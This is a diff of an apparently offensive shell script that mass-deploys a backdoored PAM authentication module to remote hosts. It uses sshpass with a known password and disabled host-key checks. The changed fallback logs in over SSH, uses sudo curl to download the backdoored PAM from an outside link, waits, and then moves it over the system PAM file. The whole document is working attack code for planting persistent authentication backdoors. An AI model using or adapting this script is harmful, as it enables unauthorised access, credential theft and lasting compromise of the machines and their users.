@@ -31,9 +31,14 @@ main() {
             sshpass -p "$password" scp -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$path_to_backdoored_pam" "$username@$IP:$path_to_pam" && \
             echo "SUCCESS  (SCP): $IP" || \
             {
-                sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$username@$IP" "echo \"$password\" | sudo -S curl -o \"$path_to_pam\" \"$link_to_backdoored_pam\"" && \
-                echo "SUCCESS (CURL): $IP" || \
-                echo "FAIL    (CURL): $IP"
+                sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$username@$IP" "
+                    echo \"$password\" | sudo -S curl -o \"$path_to_backdoored_pam\" \"$link_to_backdoored_pam\" && \
+                    sleep 10 && \
+                    echo \"$password\" | sudo -S mv \"$path_to_backdoored_pam\" \"$path_to_pam\"
+                " && \
+echo "SUCCESS (CURL): $IP" || \
+echo "FAIL    (CURL): $IP"
+
             }
         } &
 
